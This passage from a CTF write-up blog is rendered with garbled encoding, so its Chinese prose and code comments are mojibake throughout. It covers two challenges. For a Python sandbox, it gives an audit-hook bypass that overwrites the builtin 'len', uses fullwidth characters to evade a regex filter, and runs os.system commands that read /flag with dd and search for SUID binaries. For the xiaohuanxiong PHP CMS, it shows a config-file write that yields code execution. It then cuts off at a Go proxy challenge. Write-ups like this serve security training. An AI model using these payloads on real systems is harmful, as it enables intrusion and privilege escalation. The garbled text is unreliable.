çš„åˆ—è¡¨ï¼ŒåŒ…å«äº†ä¸€ç³»åˆ—ä¸å¸Œæœ›è¢«æ‰§è¡Œçš„å‡½æ•°æˆ–æ“ä½œçš„åç§°ã€‚è¿™äº›æ“ä½œé€šå¸¸å› ä¸ºå®‰å…¨æ€§åŸå› è€Œè¢«è®¤ä¸ºæ˜¯é«˜é£é™©çš„ã€‚</li></ul></li><li><p>äº‹ä»¶åç§°é•¿åº¦æ£€æŸ¥</p><p>ï¼š</p><ul><li><code>if len(event_name) &gt; 4: raise RuntimeError(&quot;Too Long!&quot;)</code> ï¼šè¿™è¡Œä»£ç æ£€æŸ¥  <code>event_name</code>  çš„é•¿åº¦æ˜¯å¦è¶…è¿‡ 4 ä¸ªå­—ç¬¦ã€‚å¦‚æœæ˜¯ï¼Œåˆ™æŠ›å‡º  <code>RuntimeError</code>  å¼‚å¸¸ï¼Œå¼‚å¸¸ä¿¡æ¯ä¸º â€œToo Long!â€ã€‚è¿™ä¸ªæ£€æŸ¥çœ‹èµ·æ¥æ˜¯éšæ„è®¾ç½®çš„ï¼Œå› ä¸ºäº‹ä»¶åç§°çš„é•¿åº¦é€šå¸¸ä¸å®‰å…¨æ€§æ— ç›´æ¥å…³è”ã€‚</li></ul></li><li><p>é»‘åå•æ£€æŸ¥</p><p>ï¼š</p><ul><li>å¾ªç¯éå†  <code>blacklist</code>  åˆ—è¡¨ï¼Œæ£€æŸ¥  <code>event_name</code>  ä¸­æ˜¯å¦åŒ…å«åˆ—è¡¨ä¸­çš„ä»»ä½•å­—ç¬¦ä¸²ã€‚å¦‚æœåŒ…å«ï¼Œåˆ™æŠ›å‡º  <code>RuntimeError</code>  å¼‚å¸¸ï¼Œå¼‚å¸¸ä¿¡æ¯ä¸º â€œNo!â€ã€‚è¿™ä¸ªæ£€æŸ¥æ—¨åœ¨é˜»æ­¢æ‰§è¡Œé»‘åå•ä¸­åˆ—å‡ºçš„é«˜é£é™©æ“ä½œã€‚</li></ul></li><li><p>è®¾ç½®å®¡è®¡é’©å­</p><p>ï¼š</p><ul><li><code>__import__('sys').addaudithook(my_audit_hook)</code> ï¼šè¿™è¡Œä»£ç é¦–å…ˆåŠ¨æ€å¯¼å…¥  <code>sys</code>  æ¨¡å—ï¼ˆå°½ç®¡é€šå¸¸ç›´æ¥å¯¼å…¥  <code>sys</code>  æ¨¡å—æ›´ä¸ºå¸¸è§ï¼‰ï¼Œç„¶åè°ƒç”¨  <code>sys.addaudithook</code>  æ–¹æ³•ï¼Œå°†  <code>my_audit_hook</code>  å‡½æ•°è®¾ç½®ä¸ºå®¡è®¡é’©å­ã€‚è¿™æ„å‘³ç€æ¯å½“ Python è§£é‡Šå™¨æ‰§è¡Œä¸€ä¸ªå®¡è®¡äº‹ä»¶æ—¶ï¼Œ <code>my_audit_hook</code>  å‡½æ•°éƒ½ä¼šè¢«è°ƒç”¨ã€‚</li></ul></li></ol><p><strong>æ³¨æ„</strong>ï¼š</p><ul><li>å®¡è®¡é’©å­æ˜¯ä¸€ä¸ªå¼ºå¤§çš„ç‰¹æ€§ï¼Œåº”è¯¥è°¨æ…ä½¿ç”¨ã€‚ä¸å½“çš„å®¡è®¡é’©å­è®¾ç½®å¯èƒ½ä¼šé˜»æ­¢åˆæ³•çš„æ“ä½œï¼Œå¯¼è‡´ç¨‹åºæ— æ³•æ­£å¸¸è¿è¡Œã€‚</li><li>åœ¨å®é™…ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå¯¹å®¡è®¡é’©å­çš„ä½¿ç”¨åº”è¯¥åŸºäºè¯¦ç»†çš„å®‰å…¨åˆ†æå’Œé£é™©è¯„ä¼°ã€‚</li></ul><p>- æ­¤ä»£ç ç¤ºä¾‹ä¸­çš„é•¿åº¦æ£€æŸ¥å’Œé»‘åå•å¯èƒ½éœ€è¦æ ¹æ®å®é™…çš„å®‰å…¨éœ€æ±‚è¿›è¡Œè°ƒæ•´ã€‚</p></blockquote><p>â€‹çœ‹ä¸Šå»åƒæ˜¯ä¸€ä¸ªæ²™ç®±ï¼Œå°†ä»£ç å†™å…¥æ–‡ä»¶ï¼Œç„¶åè¿è¡Œï¼Œæ•è·è¾“å‡ºï¼Œéœ€è¦é€ƒé€¸ï¼š<span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTI2NDc/dGltZV9fMTMxMT1HcUd4dURSaVlpd3hscnpHN0R5R0RjR3Zmb1k1UW1vM3gjdG9jLTM0">https://xz.aliyun.com/t/12647?time__1311=GqGxuDRiYiwxlrzG7DyGDcGvfoY5Qmo3x#toc-34</span> ç»•è¿‡ audit hook</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">do</span>(<span class="params">source_code</span>):  </span><br><span class="line">    <span class="comment"># å®šä¹‰äº†ä¸€ä¸ªåä¸ºdoçš„å‡½æ•°ï¼Œå®ƒæ¥å—ä¸€ä¸ªå‚æ•°source_codeï¼Œè¿™ä¸ªå‚æ•°é¢„æœŸæ˜¯ä¸€ä¸ªåŒ…å«Pythonæºä»£ç çš„å­—ç¬¦ä¸²ã€‚  </span></span><br><span class="line">  </span><br><span class="line">    hook_code = <span class="string">&#x27;&#x27;&#x27;  </span></span><br><span class="line"><span class="string">def my_audit_hook(event_name, arg):  </span></span><br><span class="line"><span class="string">    # å®šä¹‰äº†ä¸€ä¸ªå®¡è®¡é’©å­å‡½æ•°my_audit_hookï¼Œå®ƒæ¥å—ä¸¤ä¸ªå‚æ•°ï¼ševent_nameå’Œargã€‚  </span></span><br><span class="line"><span class="string">    # è¿™ä¸ªå‡½æ•°ä¼šåœ¨Pythonçš„å®¡è®¡äº‹ä»¶å‘ç”Ÿæ—¶è¢«è°ƒç”¨ã€‚  </span></span><br><span class="line"><span class="string">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]  </span></span><br><span class="line"><span class="string">    # å®šä¹‰äº†ä¸€ä¸ªé»‘åå•åˆ—è¡¨ï¼ŒåŒ…å«äº†ä¸€äº›å¯èƒ½è¢«è®¤ä¸ºæ˜¯ä¸å®‰å…¨çš„å‡½æ•°åã€‚  </span></span><br><span class="line"><span class="string">    if len(event_name) &gt; 4:  </span></span><br><span class="line"><span class="string">        # æ£€æŸ¥äº‹ä»¶åç§°çš„é•¿åº¦æ˜¯å¦è¶…è¿‡4ä¸ªå­—ç¬¦ã€‚  </span></span><br><span class="line"><span class="string">        # æ³¨æ„ï¼šè¿™ä¸ªæ£€æŸ¥å¯èƒ½å¹¶ä¸ç›´æ¥ä¸å®‰å…¨ç›¸å…³ï¼Œå®ƒå¯èƒ½æ˜¯ä¸€ä¸ªç¤ºä¾‹æˆ–å ä½ç¬¦ã€‚  </span></span><br><span class="line"><span class="string">        raise RuntimeError(&quot;Too Long!&quot;)  </span></span><br><span class="line"><span class="string">    # å¦‚æœäº‹ä»¶åç§°å¤ªé•¿ï¼Œåˆ™æŠ›å‡ºè¿è¡Œæ—¶é”™è¯¯ã€‚  </span></span><br><span class="line"><span class="string">    for bad in blacklist:  </span></span><br><span class="line"><span class="string">        # éå†é»‘åå•åˆ—è¡¨ã€‚  </span></span><br><span class="line"><span class="string">        if bad in event_name:  </span></span><br><span class="line"><span class="string">            # æ£€æŸ¥äº‹ä»¶åç§°æ˜¯å¦åŒ…å«é»‘åå•ä¸­çš„ä»»ä½•å­—ç¬¦ä¸²ã€‚  </span></span><br><span class="line"><span class="string">            raise RuntimeError(&quot;No!&quot;)  </span></span><br><span class="line"><span class="string">    # å¦‚æœäº‹ä»¶åç§°åŒ…å«é»‘åå•ä¸­çš„å­—ç¬¦ä¸²ï¼Œåˆ™æŠ›å‡ºè¿è¡Œæ—¶é”™è¯¯ã€‚  </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)  </span></span><br><span class="line"><span class="string"># ä½¿ç”¨__import__å‡½æ•°åŠ¨æ€å¯¼å…¥sysæ¨¡å—ï¼Œå¹¶è°ƒç”¨å…¶addaudithookæ–¹æ³•æ³¨å†Œå®¡è®¡é’©å­å‡½æ•°ã€‚  </span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>  </span><br><span class="line">    <span class="comment"># å¤šè¡Œå­—ç¬¦ä¸²ç»“æŸï¼Œæ­¤æ—¶hook_codeå˜é‡åŒ…å«äº†ä¸Šè¿°å®¡è®¡é’©å­å‡½æ•°çš„å®šä¹‰å’Œæ³¨å†Œä»£ç ã€‚  </span></span><br><span class="line">  </span><br><span class="line">    <span class="built_in">print</span>(source_code)  </span><br><span class="line">    <span class="comment"># æ‰“å°ä¼ å…¥çš„æºä»£ç å­—ç¬¦ä¸²ï¼Œè¿™åœ¨è°ƒè¯•æ—¶å¯èƒ½æœ‰ç”¨ï¼Œä½†åœ¨ç”Ÿäº§ç¯å¢ƒä¸­å¯èƒ½æ³„éœ²æ•æ„Ÿä¿¡æ¯ã€‚  </span></span><br><span class="line">  </span><br><span class="line">    code = hook_code + source_code  </span><br><span class="line">    <span class="comment"># å°†å®¡è®¡é’©å­ä»£ç å’Œä¼ å…¥çš„æºä»£ç æ‹¼æ¥åœ¨ä¸€èµ·ï¼Œå½¢æˆä¸€ä¸ªå®Œæ•´çš„Pythonè„šæœ¬ã€‚  </span></span><br><span class="line">  </span><br><span class="line">    <span class="comment"># æ³¨æ„ï¼šä¸‹é¢è¿™è¡Œä»£ç å®é™…ä¸Šå¹¶æ²¡æœ‰åœ¨åç»­é€»è¾‘ä¸­ä½¿ç”¨treeå˜é‡ã€‚  </span></span><br><span class="line">    tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)  </span><br><span class="line">    <span class="comment"># ä½¿ç”¨compileå‡½æ•°å°è¯•å°†æºä»£ç ç¼–è¯‘ä¸ºå­—èŠ‚ç ï¼Œä½†å®é™…ä¸Šç”±äºæŒ‡å®šäº†ast.PyCF_ONLY_ASTæ ‡å¿—ï¼Œ  </span></span><br><span class="line">    <span class="comment"># è¿™è¡Œä»£ç ä¼šè¿”å›ä¸€ä¸ªASTï¼ˆæŠ½è±¡è¯­æ³•æ ‘ï¼‰å¯¹è±¡è€Œä¸æ˜¯å­—èŠ‚ç ã€‚ç„¶è€Œï¼Œè¿™ä¸ªASTå¯¹è±¡å¹¶æ²¡æœ‰è¢«åç»­ä»£ç ä½¿ç”¨ã€‚  </span></span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        <span class="comment"># å°è¯•æ‰§è¡Œä»¥ä¸‹ä»£ç å—ã€‚  </span></span><br><span class="line">        <span class="keyword">if</span> verify_secure(tree):  </span><br><span class="line">            <span class="comment"># è°ƒç”¨ä¸€ä¸ªåä¸ºverify_secureçš„å‡½æ•°ï¼Œä¼ å…¥ä¹‹å‰ç¼–è¯‘å¾—åˆ°çš„ASTå¯¹è±¡ï¼ˆå°½ç®¡è¿™ä¸ªå¯¹è±¡å¹¶æ²¡æœ‰çœŸæ­£è¢«ä½¿ç”¨ï¼‰ã€‚  </span></span><br><span class="line">            <span class="comment"># æ³¨æ„ï¼šverify_secureå‡½æ•°æ²¡æœ‰åœ¨ä»£ç ä¸­å®šä¹‰ï¼Œå› æ­¤è¿™æ®µä»£ç åœ¨å®é™…è¿è¡Œæ—¶ä¼šæŠ›å‡ºNameErrorã€‚  </span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;run.py&quot;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">                <span class="comment"># æ‰“å¼€ï¼ˆæˆ–åˆ›å»ºï¼‰ä¸€ä¸ªåä¸ºrun.pyçš„æ–‡ä»¶ï¼Œå¹¶å‡†å¤‡å†™å…¥å†…å®¹ã€‚  </span></span><br><span class="line">                f.write(code)  </span><br><span class="line">            <span class="comment"># å°†ä¹‹å‰æ‹¼æ¥å¥½çš„ä»£ç å†™å…¥run.pyæ–‡ä»¶ã€‚  </span></span><br><span class="line">            result = subprocess.run([<span class="string">&#x27;python&#x27;</span>, <span class="string">&#x27;run.py&#x27;</span>], stdout=subprocess.PIPE, timeout=<span class="number">5</span>).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)  </span><br><span class="line">            <span class="comment"># ä½¿ç”¨subprocessæ¨¡å—è¿è¡Œrun.pyè„šæœ¬ï¼Œæ•è·å…¶æ ‡å‡†è¾“å‡ºï¼Œå¹¶å°è¯•å°†è¾“å‡ºè§£ç ä¸ºUTF-8å­—ç¬¦ä¸²ã€‚  </span></span><br><span class="line">            <span class="comment"># è¿™é‡Œè¿˜è®¾ç½®äº†ä¸€ä¸ª5ç§’çš„è¶…æ—¶æ—¶é—´ã€‚  </span></span><br><span class="line">            os.remove(<span class="string">&#x27;run.py&#x27;</span>)  </span><br><span class="line">            <span class="comment"># åˆ é™¤run.pyæ–‡ä»¶ï¼Œæ¸…ç†æ‰§è¡Œç¯å¢ƒã€‚  </span></span><br><span class="line">            <span class="keyword">return</span> result  </span><br><span class="line">        <span class="comment"># å¦‚æœverify_secureå‡½æ•°è¿”å›Trueï¼ˆè¡¨ç¤ºä»£ç è¢«è®¤ä¸ºæ˜¯å®‰å…¨çš„ï¼‰ï¼Œåˆ™æ‰§è¡Œä¸Šè¿°ä»£ç å—å¹¶è¿”å›æ‰§è¡Œç»“æœã€‚  </span></span><br><span class="line">        <span class="keyword">else</span>:  </span><br><span class="line">            <span class="comment"># å¦‚æœä»£ç è¢«è®¤ä¸ºæ˜¯ä¸å®‰å…¨çš„ï¼Œåˆ™è¿”å›ä¸€æ¡æ¶ˆæ¯è¡¨ç¤ºæ‰§è¡Œè¢«ä¸­æ­¢ã€‚  </span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Execution aborted due to security concerns.&quot;</span>  </span><br><span class="line">    <span class="keyword">except</span>:  </span><br><span class="line">        <span class="comment"># æ•è·æ‰€æœ‰å¼‚å¸¸ï¼ˆè¿™æ˜¯ä¸€ä¸ªä¸æ¨èçš„åšæ³•ï¼Œå› ä¸ºå®ƒä¼šæ•è·åŒ…æ‹¬ç¼–ç¨‹é”™è¯¯åœ¨å†…çš„æ‰€æœ‰å¼‚å¸¸ï¼‰ã€‚  </span></span><br><span class="line">        os.remove(<span class="string">&#x27;run.py&#x27;</span>)  </span><br><span class="line">        <span class="comment"># æ— è®ºå‘ç”Ÿä»€ä¹ˆå¼‚å¸¸ï¼Œéƒ½å°è¯•åˆ é™¤run.pyæ–‡ä»¶ã€‚  </span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout!&quot;</span>  </span><br><span class="line">    <span class="comment"># å¦‚æœå‘ç”Ÿå¼‚å¸¸ï¼Œåˆ™è¿”å›ä¸€æ¡å¯èƒ½è¯¯å¯¼çš„æ¶ˆæ¯ï¼ˆ&quot;Timeout!&quot;ï¼‰ï¼Œå³ä½¿å¼‚å¸¸çš„åŸå› å¯èƒ½å¹¶ä¸æ˜¯è¶…æ—¶ã€‚</span></span><br></pre></td></tr></table></figure><p>â€‹å¤§æ¦‚å°±è¿™äº›äº†ï¼Œå…ˆåšä¸ªæµ‹è¯•å§ï¼ŒåŠè§’å½¢å¼ä¼¼ä¹èƒ½ç»•è¿‡ç¬¦å·æ­£åˆ™åŒ¹é…ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;blocks&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;languageVersion&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span><span class="attr">&quot;blocks&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;text&quot;</span><span class="punctuation">,</span><span class="attr">&quot;fields&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;TEXT&quot;</span><span class="punctuation">:</span><span class="string">&quot;ï¼‡ï¼›ï½ï½’ï½‰ï½ï½”ï¼ˆï½ï½ï½…ï½ï¼ˆï¼‚ï¼ï½…ï½”ï½ƒï¼ï½ï½ï½“ï½“ï½—ï½„ï¼‚ï¼‰ï¼ï½’ï½…ï½ï½„ï¼ˆï¼‰ï¼‰ï¼ƒ&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹æ ¹æ®ä¸Šé¢çš„ç»•è¿‡æ²™ç®±æ–¹å¼ï¼Œè¿™é‡Œå¯ä»¥è®© len æ°¸ä¹…æ€§å°äº 1ï¼Œå°±æ˜¯é‡å†™å†…ç½®å‡½æ•° lenï¼Œæ„é€ ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;__import__(&#x27;</span>sys<span class="string">&#x27;).modules[&#x27;</span>__main__<span class="string">&#x27;].__dict__[&#x27;</span>__builtins__<span class="string">&#x27;].__dict__[&#x27;</span><span class="built_in">len</span><span class="string">&#x27;] = lambda x: 1</span></span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åå°±æ˜¯è¯» flag äº†ï¼š<span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8vZ3Rmb2JpbnMvZGQvJUVGJUJDJThDJUU5JTlDJTgwJUU4JUE2JTgxJUU3JTk0JUE4JUU1JTg4JUIwJUU4JUJGJTk5JUU0JUI4JUFBJUVGJUJDJThDJUU0JUI4JThEJUU4JUJGJTg3JUU0JUI4JThEJUU3JTlGJUE1JUU5JTgxJTkzJUU1JTg1JUI3JUU0JUJEJTkzJUU1JThFJTlGJUU3JTkwJTg2JUVGJUJDJThDJUU0JUJDJUIwJUU2JTkxJUI4JUU3JTlEJTgwJUU1JUJBJTk0JUU4JUFGJUE1JUU2JTk4JUFGJUU2JThGJTkwJUU2JTlEJTgzJUVGJUJDJThDJUU2JUFGJTk1JUU3JUFCJTlGJUU2JUIyJTk5JUU3JUFFJUIxJUU1JThGJUFGJUU4JTgzJUJEJUU2JUIyJUExJUU2JTlDJTg5JUU2JTlEJTgzJUU5JTk5JTkwJUVGJUJDJTg4JUU3JThDJTlDJUU3JTlBJTg0JUVGJUJDJThDJUU1JThGJUFGJUU4JTgzJUJEJUU0JUI4JThEJUU1JUFGJUI5JUVGJUJDJTg5JUUzJTgwJTgy">https://gtfobins.github.io/gtfobins/dd/ï¼Œéœ€è¦ç”¨åˆ°è¿™ä¸ªï¼Œä¸è¿‡ä¸çŸ¥é“å…·ä½“åŸç†ï¼Œä¼°æ‘¸ç€åº”è¯¥æ˜¯ææƒï¼Œæ¯•ç«Ÿæ²™ç®±å¯èƒ½æ²¡æœ‰æƒé™ï¼ˆçŒœçš„ï¼Œå¯èƒ½ä¸å¯¹ï¼‰ã€‚</span></p><p>â€‹payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;;__import__(&#x27;</span>sys<span class="string">&#x27;).modules[&#x27;</span>__main__<span class="string">&#x27;].__dict__[&#x27;</span>__builtins__<span class="string">&#x27;].__dict__[&#x27;</span><span class="built_in">len</span><span class="string">&#x27;] = lambda x: 1</span></span><br><span class="line"><span class="string">print(len(&quot;aaaaaa&quot;))</span></span><br><span class="line"><span class="string">__import__(&#x27;</span>os<span class="string">&#x27;).system(&#x27;</span>ls<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">__import__(&#x27;</span>os<span class="string">&#x27;).system(&#x27;</span>LFILE=file_to_read dd <span class="keyword">if</span>=/flag<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">__import__(&#x27;</span>os<span class="string">&#x27;).system(&#x27;</span>find / -user root -perm -<span class="number">4000</span> -<span class="built_in">print</span> <span class="number">2</span>&gt;/dev/null<span class="string">&#x27;)#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#æ”¹ä¸ºåŠè§’ï¼ŒåŠ ä¸Š\nï¼š</span></span><br><span class="line"><span class="string">ï¼‡ï¼›ï¼¿ï¼¿ï½‰ï½ï½ï½ï½’ï½”ï¼¿ï¼¿ï¼ˆï¼‡ï½“ï½™ï½“ï¼‡ï¼‰ï¼ï½ï½ï½„ï½•ï½Œï½…ï½“ï¼»ï¼‡ï¼¿ï¼¿ï½ï½ï½‰ï½ï¼¿ï¼¿ï¼‡ï¼½ï¼ï¼¿ï¼¿ï½„ï½‰ï½ƒï½”ï¼¿ï¼¿ï¼»ï¼‡ï¼¿ï¼¿ï½‚ï½•ï½‰ï½Œï½”ï½‰ï½ï½“ï¼¿ï¼¿ï¼‡ï¼½ï¼ï¼¿ï¼¿ï½„ï½‰ï½ƒï½”ï¼¿ï¼¿ï¼»ï¼‡ï½Œï½…ï½ï¼‡ï¼½ ï¼ ï½Œï½ï½ï½‚ï½„ï½ ï½˜ï¼š ï¼‘\nï½ï½’ï½‰ï½ï½”ï¼ˆï½Œï½…ï½ï¼ˆï¼‚ï½ï½ï½ï½ï½ï½ï¼‚ï¼‰ï¼‰\nï¼¿ï¼¿ï½‰ï½ï½ï½ï½’ï½”ï¼¿ï¼¿ï¼ˆï¼‡ï½ï½“ï¼‡ï¼‰ï¼ï½“ï½™ï½“ï½”ï½…ï½ï¼ˆï¼‡ï½Œï½“ï¼‡ï¼‰\nï¼¿ï¼¿ï½‰ï½ï½ï½ï½’ï½”ï¼¿ï¼¿ï¼ˆï¼‡ï½ï½“ï¼‡ï¼‰ï¼ï½“ï½™ï½“ï½”ï½…ï½ï¼ˆï¼‡ï¼¬ï¼¦ï¼©ï¼¬ï¼¥ï¼ï½†ï½‰ï½Œï½…ï¼¿ï½”ï½ï¼¿ï½’ï½…ï½ï½„ ï½„ï½„ ï½‰ï½†ï¼ï¼ï½†ï½Œï½ï½‡ï¼‡ï¼‰\nï¼¿ï¼¿ï½‰ï½ï½ï½ï½’ï½”ï¼¿ï¼¿ï¼ˆï¼‡ï½ï½“ï¼‡ï¼‰ï¼ï½“ï½™ï½“ï½”ï½…ï½ï¼ˆï¼‡ï½†ï½‰ï½ï½„ ï¼ ï¼ï½•ï½“ï½…ï½’ ï½’ï½ï½ï½” ï¼ï½ï½…ï½’ï½ ï¼ï¼”ï¼ï¼ï¼ ï¼ï½ï½’ï½‰ï½ï½” ï¼’ï¼ï¼ï½„ï½…ï½–ï¼ï½ï½•ï½Œï½Œï¼‡ï¼‰ï¼ƒ</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h2 id="xiaohuanxiong"><a class="markdownIt-Anchor" href="#xiaohuanxiong">#</a> xiaohuanxiongï¼š</h2><p>â€‹é¡¹ç›®åœ°å€ï¼š<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZvcmthYmxlL3hpYW9odWFueGlvbmc=">https://github.com/forkable/xiaohuanxiong</span></p><p>â€‹å¼€å§‹å®¡è®¡ï¼š</p><p>â€‹å­˜åœ¨ admin æ–‡ä»¶å¤¹ï¼Œé‚£ä¼°è®¡æ´å¯èƒ½åœ¨ admin é‡Œé¢ï¼Œå…ˆçœ‹é‡Œé¢ï¼š</p><ol><li>Admins æœ‰åˆ›å»ºã€ç®¡ç†ã€åˆ é™¤ç®¡ç†å‘˜ç”¨æˆ·çš„åŠŸèƒ½ï¼Œæ¨æµ‹å¯èƒ½ä¼šæœ‰æ´ï¼Œä½†å®é™…ä¸Šå¹¶æ²¡æœ‰ç”¨åˆ°è¿™é‡Œã€‚</li><li>Areasã€Authorsã€Bannersã€BaseAdminã€Booksã€Chapters ä¸€ç›´åˆ° Login éƒ½æ²¡å•¥ç”¨ï¼Œå°±æ­£å¸¸çš„ç®¡ç†ç³»ç»Ÿ</li></ol><p>â€‹å½“çœ‹åˆ° Payment çš„æ—¶å€™ï¼Œå‘ç°äº†ä¸€ä¸ªé‡è¦çš„ç‚¹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ”¯ä»˜é…ç½®æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">isPost</span>()) &#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="title function_ invoke__">input</span>(<span class="string">&#x27;json&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="title class_">App</span>::<span class="title function_ invoke__">getRootPath</span>() . <span class="string">&#x27;config/payment.php&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">success</span>(<span class="string">&#x27;ä¿å­˜æˆåŠŸ&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="title class_">App</span>::<span class="title function_ invoke__">getRootPath</span>() . <span class="string">&#x27;config/payment.php&#x27;</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">assign</span>(<span class="string">&#x27;json&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">view</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹ä¿å­˜é…ç½®æ–‡ä»¶ï¼Œå­˜åœ¨æ–‡ä»¶å†™å…¥çš„é—®é¢˜ï¼Œå†™å…¥çš„è¿˜æ˜¯ php æ–‡ä»¶ï¼Œä¹‹åè¿›å…¥ admin/payment çœ‹çœ‹ï¼Œå‘ç°äº†è¿™äº›ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/5d7af358c0c44f88a3533e0b7ad15c01.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹è¿™é‡Œé¢å†™å…¥ payload å³å¯ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/fe6bfe2f95e64d48ad701b6676f12492.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹<img data-src="https://i-blog.csdnimg.cn/direct/fbe689cea973480aa83b960ff34ec977.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2db4c362-5f6f-4c81-b77e-d27ec7fcb6aa&#125;</span><br></pre></td></tr></table></figure><h2 id="proxy"><a class="markdownIt-Anchor" href="#proxy">#</a> proxyï¼š</h2><p>â€‹è¿™æ®µä»£ç å®šä¹‰äº†ä¸€ä¸ªä½¿ç”¨ Gin æ¡†æ¶çš„ Go Web æœåŠ¡å™¨ï¼Œå®ƒæä¾›äº†ä¸¤ä¸ª API æ¥å£ï¼Œåˆ†åˆ«ä½äº  <code>/v1/api/flag</code>  å’Œ  <code>/v2/api/proxy</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 